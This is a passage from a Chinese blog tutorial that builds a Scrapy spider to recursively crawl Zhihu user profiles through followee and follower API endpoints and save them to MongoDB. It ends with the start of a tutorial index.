                          <pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Item, Field</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="symbol">UserItem</span>(<span class="symbol">Item</span>):</span><br><span class="line">    # <span class="symbol">define</span> <span class="symbol">the</span> <span class="symbol">fields</span> <span class="symbol">for</span> <span class="symbol">your</span> <span class="symbol">item</span> <span class="symbol">here</span> <span class="symbol">like:</span></span><br><span class="line">    <span class="symbol">id</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">name</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">avatar_url</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">headline</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">description</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">url</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">url_token</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">gender</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">cover_url</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">type</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">badge</span> = <span class="symbol">Field</span>()</span><br><span class="line"></span><br><span class="line">    <span class="symbol">answer_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">articles_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">commercial_question_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">favorite_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">favorited_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">follower_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">following_columns_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">following_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">pins_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">question_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">thank_from_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">thank_to_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">thanked_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">vote_from_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">vote_to_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">voteup_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">following_favlists_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">following_question_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">following_topic_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">marked_answers_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">mutual_followees_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">hosted_live_count</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">participated_live_count</span> = <span class="symbol">Field</span>()</span><br><span class="line"></span><br><span class="line">    <span class="symbol">locations</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">educations</span> = <span class="symbol">Field</span>()</span><br><span class="line">    <span class="symbol">employments</span> = <span class="symbol">Field</span>()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>所以在解析方法里面我们解析得到的response内容，然后转为json对象，然后依次判断字段是否存在，赋值就好了。</p>
                  <figure class="highlight livecodeserver">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="built_in">result</span> = json.loads(response.<span class="keyword">text</span>)</span><br><span class="line"><span class="keyword">item</span> = UserItem()</span><br><span class="line"><span class="keyword">for</span> field <span class="keyword">in</span> <span class="keyword">item</span>.fields:</span><br><span class="line">    <span class="keyword">if</span> field <span class="keyword">in</span> <span class="built_in">result</span>.<span class="built_in">keys</span>():</span><br><span class="line">        <span class="keyword">item</span>[field] = <span class="built_in">result</span>.<span class="built_in">get</span>(field)</span><br><span class="line">yield <span class="keyword">item</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>得到item后通过yield返回就好了。 这样保存用户基本信息就完成了。 接下来我们还需要在这里获取这个用户的关注列表，所以我们需要再重新发起一个获取关注列表的request 在parse_user后面再添加如下代码：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">yield Request(</span><br><span class="line">            self.follows_url.format(<span class="attribute">user</span>=result.get('url_token'), <span class="attribute">include</span>=self.follows_query, <span class="attribute">limit</span>=20, <span class="attribute">offset</span>=0),</span><br><span class="line">            self.parse_follows)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样我们又生成了获取该用户关注列表的请求。</p>
                  <h2 id="parse-follows"><a href="#parse-follows" class="headerlink" title="parse_follows"></a>parse_follows</h2>
                  <p>接下来我们处理一下关注列表，首先也是解析response的文本，然后要做两件事：</p>
                  <ul>
                    <li>通过关注列表的每一个用户，对每一个用户发起请求，获取其详细信息。</li>
                    <li>处理分页，判断paging内容，获取下一页关注列表。</li>
                  </ul>
                  <p>所以在这里将parse_follows改写如下：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">results = json.loads(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'data'</span> <span class="keyword">in</span> results.keys():</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results.<span class="builtin-name">get</span>(<span class="string">'data'</span>):</span><br><span class="line">        yield Request(self.user_url.format(<span class="attribute">user</span>=result.get('url_token'), <span class="attribute">include</span>=self.user_query),</span><br><span class="line">                      self.parse_user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'paging'</span> <span class="keyword">in</span> results.keys() <span class="keyword">and</span> results.<span class="builtin-name">get</span>(<span class="string">'paging'</span>).<span class="builtin-name">get</span>(<span class="string">'is_end'</span>) == <span class="literal">False</span>:</span><br><span class="line">    next_page = results.<span class="builtin-name">get</span>(<span class="string">'paging'</span>).<span class="builtin-name">get</span>(<span class="string">'next'</span>)</span><br><span class="line">    yield Request(next_page,</span><br><span class="line">                  self.parse_follows)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样，整体代码如下：</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">from scrapy import Spider, Request</span><br><span class="line">from zhihuuser.items import UserItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZhihuSpider</span>(<span class="title">Spider</span>):</span></span><br><span class="line">    name = <span class="string">"zhihu"</span></span><br><span class="line">    allowed_domains = [<span class="string">"www.zhihu.com"</span>]</span><br><span class="line">    user_url = <span class="string">'https://www.zhihu.com/api/v4/members/&#123;user&#125;?include=&#123;include&#125;'</span></span><br><span class="line">    follows_url = <span class="string">'https://www.zhihu.com/api/v4/members/&#123;user&#125;/followees?include=&#123;include&#125;&amp;amp;offset=&#123;offset&#125;&amp;amp;limit=&#123;limit&#125;'</span></span><br><span class="line">    start_user = <span class="string">'excited-vczh'</span></span><br><span class="line">    user_query = <span class="string">'locations,employments,gender,educations,business,voteup_count,thanked_Count,follower_count,following_count,cover_url,following_topic_count,following_question_count,following_favlists_count,following_columns_count,answer_count,articles_count,pins_count,question_count,commercial_question_count,favorite_count,favorited_count,logs_count,marked_answers_count,marked_answers_text,message_thread_token,account_status,is_active,is_force_renamed,is_bind_sina,sina_weibo_url,sina_weibo_name,show_sina_weibo,is_blocking,is_blocked,is_following,is_followed,mutual_followees_count,vote_to_count,vote_from_count,thank_to_count,thank_from_count,thanked_count,description,hosted_live_count,participated_live_count,allow_message,industry_category,org_name,org_homepage,badge[?(type=best_answerer)].topics'</span></span><br><span class="line">    follows_query = <span class="string">'data[*].answer_count,articles_count,gender,follower_count,is_followed,is_following,badge[?(type=best_answerer)].topics'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_requests</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">yield</span> Request(<span class="keyword">self</span>.user_url.format(user=<span class="keyword">self</span>.start_user, <span class="keyword">include</span>=<span class="keyword">self</span>.user_query), <span class="keyword">self</span>.parse_user)</span><br><span class="line">        <span class="keyword">yield</span> Request(<span class="keyword">self</span>.follows_url.format(user=<span class="keyword">self</span>.start_user, <span class="keyword">include</span>=<span class="keyword">self</span>.follows_query, limit=<span class="number">20</span>, offset=<span class="number">0</span>),</span><br><span class="line">                      <span class="keyword">self</span>.parse_follows)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_user</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">        result = json.loads(response.text)</span><br><span class="line">        item = UserItem()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> field <span class="keyword">in</span> item.<span class="symbol">fields:</span></span><br><span class="line">            <span class="keyword">if</span> field <span class="keyword">in</span> result.keys()<span class="symbol">:</span></span><br><span class="line">                item[field] = result.get(field)</span><br><span class="line">        <span class="keyword">yield</span> item</span><br><span class="line"></span><br><span class="line">        <span class="keyword">yield</span> Request(</span><br><span class="line">            <span class="keyword">self</span>.follows_url.format(user=result.get(<span class="string">'url_token'</span>), <span class="keyword">include</span>=<span class="keyword">self</span>.follows_query, limit=<span class="number">20</span>, offset=<span class="number">0</span>),</span><br><span class="line">            <span class="keyword">self</span>.parse_follows)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_follows</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">        results = json.loads(response.text)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'data'</span> <span class="keyword">in</span> results.keys()<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">for</span> result <span class="keyword">in</span> results.get(<span class="string">'data'</span>)<span class="symbol">:</span></span><br><span class="line">                <span class="keyword">yield</span> Request(<span class="keyword">self</span>.user_url.format(user=result.get(<span class="string">'url_token'</span>), <span class="keyword">include</span>=<span class="keyword">self</span>.user_query),</span><br><span class="line">                              <span class="keyword">self</span>.parse_user)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'paging'</span> <span class="keyword">in</span> results.keys() <span class="keyword">and</span> results.get(<span class="string">'paging'</span>).get(<span class="string">'is_end'</span>) == <span class="symbol">False:</span></span><br><span class="line">            next_page = results.get(<span class="string">'paging'</span>).get(<span class="string">'next'</span>)</span><br><span class="line">            <span class="keyword">yield</span> Request(next_page,</span><br><span class="line">                          <span class="keyword">self</span>.parse_follows)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样我们就完成了获取用户基本信息，然后递归获取关注列表进一步请求了。 重新运行爬虫，可以发现当前已经可以实现循环递归爬取了。</p>
                  <h2 id="followers"><a href="#followers" class="headerlink" title="followers"></a>followers</h2>
                  <p>上面我们实现了通过获取关注列表实现爬取循环，那这里少不了的还有粉丝列表，经过分析后发现粉丝列表的api也类似，只不过把followee换成了follower，其他的完全相同，所以我们按照同样的逻辑添加followers相关信息， 最终spider代码如下：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scrapy import Spider, Request</span><br><span class="line"><span class="keyword">from</span> zhihuuser.items import UserItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ZhihuSpider(Spider):</span><br><span class="line">    name = <span class="string">"zhihu"</span></span><br><span class="line">    allowed_domains = [<span class="string">"www.zhihu.com"</span>]</span><br><span class="line">    user_url = <span class="string">'https://www.zhihu.com/api/v4/members/&#123;user&#125;?include=&#123;include&#125;'</span></span><br><span class="line">    follows_url = <span class="string">'https://www.zhihu.com/api/v4/members/&#123;user&#125;/followees?include=&#123;include&#125;&amp;offset=&#123;offset&#125;&amp;limit=&#123;limit&#125;'</span></span><br><span class="line">    followers_url = <span class="string">'https://www.zhihu.com/api/v4/members/&#123;user&#125;/followers?include=&#123;include&#125;&amp;offset=&#123;offset&#125;&amp;limit=&#123;limit&#125;'</span></span><br><span class="line">    start_user = <span class="string">'tianshansoft'</span></span><br><span class="line">    user_query = <span class="string">'locations,employments,gender,educations,business,voteup_count,thanked_Count,follower_count,following_count,cover_url,following_topic_count,following_question_count,following_favlists_count,following_columns_count,answer_count,articles_count,pins_count,question_count,commercial_question_count,favorite_count,favorited_count,logs_count,marked_answers_count,marked_answers_text,message_thread_token,account_status,is_active,is_force_renamed,is_bind_sina,sina_weibo_url,sina_weibo_name,show_sina_weibo,is_blocking,is_blocked,is_following,is_followed,mutual_followees_count,vote_to_count,vote_from_count,thank_to_count,thank_from_count,thanked_count,description,hosted_live_count,participated_live_count,allow_message,industry_category,org_name,org_homepage,badge[?(type=best_answerer)].topics'</span></span><br><span class="line">    follows_query = <span class="string">'data[*].answer_count,articles_count,gender,follower_count,is_followed,is_following,badge[?(type=best_answerer)].topics'</span></span><br><span class="line">    followers_query = <span class="string">'data[*].answer_count,articles_count,gender,follower_count,is_followed,is_following,badge[?(type=best_answerer)].topics'</span></span><br><span class="line"></span><br><span class="line">    def start_requests(self):</span><br><span class="line">        yield Request(self.user_url.format(<span class="attribute">user</span>=self.start_user, <span class="attribute">include</span>=self.user_query), self.parse_user)</span><br><span class="line">        yield Request(self.follows_url.format(<span class="attribute">user</span>=self.start_user, <span class="attribute">include</span>=self.follows_query, <span class="attribute">limit</span>=20, <span class="attribute">offset</span>=0),</span><br><span class="line">                      self.parse_follows)</span><br><span class="line">        yield Request(self.followers_url.format(<span class="attribute">user</span>=self.start_user, <span class="attribute">include</span>=self.followers_query, <span class="attribute">limit</span>=20, <span class="attribute">offset</span>=0),</span><br><span class="line">                      self.parse_followers)</span><br><span class="line"></span><br><span class="line">    def parse_user(self, response):</span><br><span class="line">        result = json.loads(response.text)</span><br><span class="line">        item = UserItem()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> field <span class="keyword">in</span> item.fields:</span><br><span class="line">            <span class="keyword">if</span> field <span class="keyword">in</span> result.keys():</span><br><span class="line">                item[field] = result.<span class="builtin-name">get</span>(field)</span><br><span class="line">        yield item</span><br><span class="line"></span><br><span class="line">        yield Request(</span><br><span class="line">            self.follows_url.format(<span class="attribute">user</span>=result.get('url_token'), <span class="attribute">include</span>=self.follows_query, <span class="attribute">limit</span>=20, <span class="attribute">offset</span>=0),</span><br><span class="line">            self.parse_follows)</span><br><span class="line"></span><br><span class="line">        yield Request(</span><br><span class="line">            self.followers_url.format(<span class="attribute">user</span>=result.get('url_token'), <span class="attribute">include</span>=self.followers_query, <span class="attribute">limit</span>=20, <span class="attribute">offset</span>=0),</span><br><span class="line">            self.parse_followers)</span><br><span class="line"></span><br><span class="line">    def parse_follows(self, response):</span><br><span class="line">        results = json.loads(response.text)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'data'</span> <span class="keyword">in</span> results.keys():</span><br><span class="line">            <span class="keyword">for</span> result <span class="keyword">in</span> results.<span class="builtin-name">get</span>(<span class="string">'data'</span>):</span><br><span class="line">                yield Request(self.user_url.format(<span class="attribute">user</span>=result.get('url_token'), <span class="attribute">include</span>=self.user_query),</span><br><span class="line">                              self.parse_user)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'paging'</span> <span class="keyword">in</span> results.keys() <span class="keyword">and</span> results.<span class="builtin-name">get</span>(<span class="string">'paging'</span>).<span class="builtin-name">get</span>(<span class="string">'is_end'</span>) == <span class="literal">False</span>:</span><br><span class="line">            next_page = results.<span class="builtin-name">get</span>(<span class="string">'paging'</span>).<span class="builtin-name">get</span>(<span class="string">'next'</span>)</span><br><span class="line">            yield Request(next_page,</span><br><span class="line">                          self.parse_follows)</span><br><span class="line"></span><br><span class="line">    def parse_followers(self, response):</span><br><span class="line">        results = json.loads(response.text)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'data'</span> <span class="keyword">in</span> results.keys():</span><br><span class="line">            <span class="keyword">for</span> result <span class="keyword">in</span> results.<span class="builtin-name">get</span>(<span class="string">'data'</span>):</span><br><span class="line">                yield Request(self.user_url.format(<span class="attribute">user</span>=result.get('url_token'), <span class="attribute">include</span>=self.user_query),</span><br><span class="line">                              self.parse_user)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'paging'</span> <span class="keyword">in</span> results.keys() <span class="keyword">and</span> results.<span class="builtin-name">get</span>(<span class="string">'paging'</span>).<span class="builtin-name">get</span>(<span class="string">'is_end'</span>) == <span class="literal">False</span>:</span><br><span class="line">            next_page = results.<span class="builtin-name">get</span>(<span class="string">'paging'</span>).<span class="builtin-name">get</span>(<span class="string">'next'</span>)</span><br><span class="line">            yield Request(next_page,</span><br><span class="line">                          self.parse_followers)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>需要改变的位置有</p>
                  <ul>
                    <li>start_requests里面添加yield followers信息</li>
                    <li>parse_user里面里面添加yield followers信息</li>
                    <li>parse_followers做相应的的抓取详情请求和翻页。</li>
                  </ul>
                  <p>如此一来，spider就完成了，这样我们就可以实现通过社交网络递归的爬取，把用户详情都爬下来。</p>
                  <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2>
                  <p>通过以上的spider，我们实现了如上逻辑：</p>
                  <ul>
                    <li>start_requests方法，实现了第一个大V用户的详细信息请求还有他的粉丝和关注列表请求。</li>
                    <li>parse_user方法，实现了详细信息的提取和粉丝关注列表的获取。</li>
                    <li>paese_follows，实现了通过关注列表重新请求用户并进行翻页的功能。</li>
                    <li>paese_followers，实现了通过粉丝列表重新请求用户并进行翻页的功能。</li>
                  </ul>
                  <h2 id="加入pipeline"><a href="#加入pipeline" class="headerlink" title="加入pipeline"></a>加入pipeline</h2>
                  <p>在这里数据库存储使用MongoDB，所以在这里我们需要借助于Item Pipeline，实现如下：</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MongoPipeline</span>(<span class="title">object</span>):</span></span><br><span class="line">    collection_name = <span class="string">'users'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, mongo_uri, mongo_db)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.mongo_uri = mongo_uri</span><br><span class="line">        <span class="keyword">self</span>.mongo_db = mongo_db</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_crawler</span><span class="params">(cls, crawler)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> cls(</span><br><span class="line">            mongo_uri=crawler.settings.get(<span class="string">'MONGO_URI'</span>),</span><br><span class="line">            mongo_db=crawler.settings.get(<span class="string">'MONGO_DATABASE'</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span><span class="params">(<span class="keyword">self</span>, spider)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.client = pymongo.MongoClient(<span class="keyword">self</span>.mongo_uri)</span><br><span class="line">        <span class="keyword">self</span>.db = <span class="keyword">self</span>.client[<span class="keyword">self</span>.mongo_db]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span><span class="params">(<span class="keyword">self</span>, spider)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.client.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(<span class="keyword">self</span>, item, spider)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.db[<span class="keyword">self</span>.collection_name].update(&#123;<span class="string">'url_token'</span>: item[<span class="string">'url_token'</span>]&#125;, &#123;<span class="string">'$set'</span>: dict(item)&#125;, True)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>比较重要的一点就在于process_item，在这里使用了update方法，第一个参数传入查询条件，这里使用的是url_token，第二个参数传入字典类型的对象，就是我们的item，第三个参数传入True，这样就可以保证，如果查询数据存在的话就更新，不存在的话就插入。这样就可以保证去重了。 另外记得开启一下Item Pileline</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">ITEM_PIPELINES</span> = &#123;</span><br><span class="line">    <span class="string">'zhihuuser.pipelines.MongoPipeline'</span>: 300,</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后重新运行爬虫</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">scrapy crawl zhihu</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样就可以发现正常的输出了，会一直不停地运行，用户也一个个被保存到数据库。 <img src="https://ww3.sinaimg.cn/large/006tKfTcly1femt2bisibj31kw0qa7fr.jpg" alt=""> 看下MongoDB，里面我们爬取的用户详情结果。 <img src="https://ww4.sinaimg.cn/large/006tKfTcgy1femtnv605cj31kw134guj.jpg" alt=""> 到现在为止，整个爬虫就基本完结了，我们主要通过递归的方式实现了这个逻辑。存储结果也通过适当的方法实现了去重。</p>
                  <h2 id="更高效率"><a href="#更高效率" class="headerlink" title="更高效率"></a>更高效率</h2>
                  <p>当然我们现在运行的是单机爬虫，只在一台电脑上运行速度是有限的，所以后面我们要想提高抓取效率，需要用到分布式爬虫，在这里需要用到Redis来维护一个公共的爬取队列。 更多的分布式爬虫的实现可以查看<a href="https://edu.hellobi.com/course/157" target="_blank" rel="noopener">自己动手，丰衣足食！Python3网络爬虫实战案例</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-04-15 03:36:48" itemprop="dateCreated datePublished" datetime="2017-04-15T03:36:48+08:00">2017-04-15</time>
                </span>
                <span id="/4380.html" class="post-meta-item leancloud_visitors" data-flag-title="利用Scrapy爬取知乎用户详细信息并存至MongoDB" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>15k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>14 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4352.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/4352.html" class="post-title-link" itemprop="url">小白学爬虫系列教程</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021225948.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021225948.jpg" alt="QQ图片20161021225948"></a> 听大才哥说好像我的文章挺难找的，这整理一下。</p>
                  <h2 id="基础知识篇："><a href="#基础知识篇：" class="headerlink" title="基础知识篇："></a>基础知识篇：</h2>
                  <p>这玩意儿我没写，各位参考大才哥的： <a href="http://cuiqingcai.com/1052.html">Python 爬虫学习系列教程</a> <a href="http://cuiqingcai.com/4320.html">Python3 爬虫学习视频教程</a></p>
                  <h2 id="小白系列教程"><a href="#小白系列教程" class="headerlink" title="小白系列教程"></a>小白系列教程</h2>
